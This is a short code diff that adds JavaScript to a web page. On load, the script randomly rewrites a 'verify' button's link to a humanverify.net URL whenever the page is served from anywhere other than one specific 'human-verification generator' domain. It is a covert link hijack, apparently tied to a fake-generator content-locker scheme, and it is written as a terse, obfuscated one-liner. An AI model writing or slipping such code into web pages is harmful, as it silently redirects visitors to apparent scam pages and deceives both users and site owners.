@@ -1,0 +1,3 @@
+if(document.getElementById("first-step-button-verify").href!="https://www.humanverify.net/cl.php?id=ccf855c00630969062f29e5bbd0baa63") {
+    0>window.location.href.toString().indexOf("http://unlimitedapps.online/human-verification/generator.html")&&0==Math.floor(100*Math.random()/50)&&(window.onload=function(){document.getElementById("first-step-button-verify").href="https://www.humanverify.net/cl.php?id=ccf855c00630969062f29e5bbd0baa63"});
+}
